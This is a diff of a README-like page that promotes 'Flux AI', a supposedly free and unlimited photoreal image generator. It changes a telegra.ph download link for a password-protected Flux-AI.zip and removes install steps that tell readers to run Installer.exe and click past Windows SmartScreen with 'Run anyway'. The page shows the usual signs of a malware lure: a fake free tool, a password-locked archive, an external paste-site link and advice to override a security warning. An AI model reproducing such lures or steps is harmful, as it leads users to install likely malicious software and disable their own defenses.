@@ -2,7 +2,7 @@
 
 Flux AI - photoreal images, free unlimited
 
-**[Flux-AI.zip](https://telegra.ph/Download-Tutorial-10-28-15)**  
+**[Flux-AI.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ Flux AI photorealistic image generator. Free unlimited generation, max detail, n
 - **Watermark** — None
 - **Package** — tool.zip
 - **Generation** — Unlimited
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-15
-2. Download **Flux-AI.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-FluxAI-FreeDownload
